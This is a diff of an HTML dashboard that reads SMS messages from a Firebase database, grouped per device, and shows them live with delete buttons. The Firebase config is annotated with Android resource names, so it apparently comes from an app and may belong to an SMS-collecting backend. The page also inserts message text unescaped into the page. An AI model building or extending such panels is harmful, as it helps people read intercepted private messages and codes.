@@ -2,29 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Firebase SMS Viewer</title>
+  <title>Realtime SMS Database</title>
   <style>
-    body { font-family: Arial, sans-serif; margin: 40px; }
-    h2 { margin-top: 30px; }
-    .sms-card {
-      background-color:#f9f9f9;
-      padding:12px;
-      margin-bottom:12px;
-      border:1px solid #ddd;
-      border-radius:6px;
-    }
-    .delete-btn {
-      background-color:#d9534f;
-      color:#fff;
-      border:none;
-      padding:5px 10px;
-      border-radius:4px;
-      cursor:pointer;
-    }
+    body {font-family: Arial, sans-serif; margin: 40px;}
+    h2 {margin-top: 30px;}
+    .sms-card{background:#f9f9f9;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;}
+    .delete-btn{background:#d9534f;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}
   </style>
 </head>
 <body>
-  <h1>Realtime SMS Database</h1>
+  <h1>Devices SMS (Realtime)</h1>
   <div id="content">Loading...</div>
 
   <!-- Firebase -->
@@ -40,59 +27,58 @@ const firebaseConfig = {
   messagingSenderId: "402219275845",                                     // <string name="gcm_defaultSenderId">
   appId: "1:402219275845:android:63a0b32cf7a20c28a9b52c"                 // <string name="google_app_id">
 };
-
     firebase.initializeApp(firebaseConfig);
     var db = firebase.database();
 
-    function loadData(){
-      const container = document.getElementById('content');
-      container.innerHTML = 'Loading...';
+    const container = document.getElementById('content');
 
-      db.ref('Devices').once('value', function(snapshot){
-        container.innerHTML = '';
-        snapshot.forEach(function(deviceSnap){
-          const deviceId = deviceSnap.key;
-          const deviceData = deviceSnap.val();
+    function render(snapshot){
+      container.innerHTML = '';
+      snapshot.forEach(function(deviceSnap){
+        const deviceId = deviceSnap.key;
+        const deviceData = deviceSnap.val();
 
-          const h2 = document.createElement('h2');
-          h2.innerText = "Device ID: " + deviceId;
-          container.appendChild(h2);
+        // device name (model) fallback to deviceId
+        let name = deviceId;
+        if(deviceData.DeviceInfo && deviceData.DeviceInfo.model){
+          name = deviceData.DeviceInfo.model;
+        }
 
-          if(deviceData.sms){
-            Object.entries(deviceData.sms).forEach(([msgId, smsObj]) =>{
-              const card = document.createElement('div');
-              card.className='sms-card';
-              card.innerHTML = `
-                <b>Sender:</b> ${smsObj.sender}<br/>
-                <b>Body:</b> ${smsObj.messageBody}<br/>
-                <b>Time:</b> ${smsObj.time}<br/>
-                <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
-              `;
-              container.appendChild(card);
-            });
-          }else{
-            const p = document.createElement('p');
-            p.innerText = 'No SMS found.';
-            container.appendChild(p);
-          }
-        });
+        const h2 = document.createElement('h2');
+        h2.innerText = name;
+        container.appendChild(h2);
+
+        if(deviceData.sms){
+          Object.entries(deviceData.sms).forEach(([msgId, smsObj])=>{
+            const card = document.createElement('div');
+            card.className = 'sms-card';
+            card.innerHTML = `
+              <b>Sender:</b> ${smsObj.sender}<br/>
+              <b>Body:</b> ${smsObj.messageBody}<br/>
+              <b>Time:</b> ${smsObj.time}<br/>
+              <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
+            `;
+            container.appendChild(card);
+          });
+        }else{
+          const p = document.createElement('p');
+          p.innerText = 'No SMS';
+          container.appendChild(p);
+        }
       });
     }
+
+    // ⏱ realtime listener
+    db.ref('Devices').on('value', function(snapshot){
+      render(snapshot);
+    });
 
     function deleteMsg(deviceId, msgId){
       if(confirm('Delete this message?')){
         db.ref(`Devices/${deviceId}/sms/${msgId}`).remove()
-          .then(function(){
-            alert('Deleted.');
-            loadData(); // refresh
-          })
-          .catch(function(e){
-            alert('Error deleting: '+ e.message);
-          });
+          .catch(e => alert("Error: " + e.message));
       }
     }
-
-    window.onload = loadData;
   </script>
 </body>
 </html>
